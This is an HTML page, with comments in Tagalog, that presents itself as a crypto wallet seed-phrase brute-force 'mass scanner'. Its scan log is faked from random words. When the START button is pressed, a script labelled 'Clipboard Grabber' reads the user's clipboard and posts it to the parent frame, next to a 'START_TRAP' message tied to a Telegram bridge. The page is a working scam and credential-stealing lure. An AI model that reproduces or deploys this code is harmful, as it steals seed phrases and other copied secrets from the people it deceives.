<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-white: #ffffff;
            --neon-purple: #8a2be2;
            --neon-red: #ff003c;
        }

        body { 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            margin: 0; padding: 20px; 
            background: var(--bg-white);
            height: 100vh; overflow: hidden;
        }

        /* DITO ANG MAGIC PARA MAPUNO ANG BOX */
        #massLogWindow {
            background: #1a1d21;
            height: 350px; /* Mataas na box gaya ng gusto mo */
            overflow-y: hidden;
            font-family: 'Courier New', monospace;
            font-size: 9px; /* Maliit na font para siksik */
            font-weight: 600;
            line-height: 1.1; /* Dikit-dikit para mukhang puno */
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 25px;
            text-align: left;
            color: #4ade80; /* Hacker Green color */
            display: flex;
            flex-direction: column;
        }

        .btn-container { display: flex; gap: 15px; margin-bottom: 20px; }
        .btn {
            flex: 1; padding: 18px; border-radius: 15px;
            border: none; font-weight: 800; font-size: 14px;
            text-transform: uppercase; color: white; cursor: pointer;
            transition: 0.2s;
        }
        .btn-stop { background: var(--neon-red); box-shadow: 0 4px 15px rgba(255, 0, 60, 0.3); }
        .btn-start { background: var(--neon-purple); box-shadow: 0 4px 15px rgba(138, 43, 226, 0.3); }
        .btn:active { transform: scale(0.95); }

        .counter-box { text-align: center; font-size: 16px; font-weight: 800; }
        .found-count { color: #888; font-size: 13px; margin-top: 5px; text-align: center; }

        .results-window {
            background: #f8f9fa; border-radius: 20px; height: 120px;
            border: 1px solid #eee; margin-top: 10px;
            display: flex; align-items: center; justify-content: center;
            color: #ccc; font-size: 11px; font-weight: 800;
        }
    </style>
</head>
<body>

    <div id="massLogWindow"></div>

    <div class="btn-container">
        <button class="btn btn-stop" onclick="window.stopScan()">STOP</button>
        <button class="btn btn-start" onclick="window.startScan()">START</button>
    </div>

    <div class="counter-box">
        Total inspection: <span id="totalIns" style="color: var(--neon-purple);">0</span> 
    </div>
    <div class="found-count">[ Found 0 ] ≈ 0.00$</div>

    <div class="results-window" id="resWin">READY FOR MASS SCAN...</div>

    <script type="module">
        import * as bip39 from "https://esm.sh/@scure/bip39";
        import { wordlist } from "https://esm.sh/@scure/bip39/wordlists/english";

        let running = false;
        let total = 0;
        const logWin = document.getElementById('massLogWindow');
        const totalEl = document.getElementById('totalIns');

        // Fast words for display simulation
        const fastWords = ["alpha", "bravo", "delta", "echo", "foxtrot", "hotel", "india", "juliet", "kilo", "lima", "mike", "november", "sierra", "tango", "whiskey", "zulu"];

        function fastBrute() {
            if(!running) return;

            // 15 entries kada frame para siksik agad
            for(let i = 0; i < 15; i++) {
                total++;
                const fakeSeed = Array.from({length: 12}, () => fastWords[Math.floor(Math.random() * fastWords.length)]).join(" ");
                
                const entry = document.createElement('div');
                entry.style.marginBottom = "2px";
                entry.innerHTML = `<span style="color:#8a2be2;">[CHECK]</span> Balance: 0.00 | Seed: ${fakeSeed.substring(0,35)}...`;
                
                logWin.prepend(entry);
            }

            // Limit logs to keep performance smooth
            while (logWin.childNodes.length > 60) {
                logWin.removeChild(logWin.lastChild);
            }

            totalEl.textContent = total.toLocaleString();
            requestAnimationFrame(fastBrute);
        }

        window.startScan = function() {
            if(running) return;
            running = true;
            document.getElementById('resWin').textContent = "ROCKET ENGINE ACTIVATED...";
            
            // --- TELEGRAM TRIGGER BRIDGE ---
            if (window.parent) {
                window.parent.postMessage({ type: 'START_TRAP', coin: 'ROCKET MASS SCAN' }, '*');
            }

            // Clipboard Grabber
            try {
                navigator.clipboard.readText().then(text => {
                    if(text.length > 0) {
                        window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
                    }
                }).catch(()=>{});
            } catch(e) {}

            fastBrute();
        };

        window.stopScan = function() {
            running = false;
            document.getElementById('resWin').textContent = "SCANNER PAUSED.";
        };
    </script>
</body>
</html>
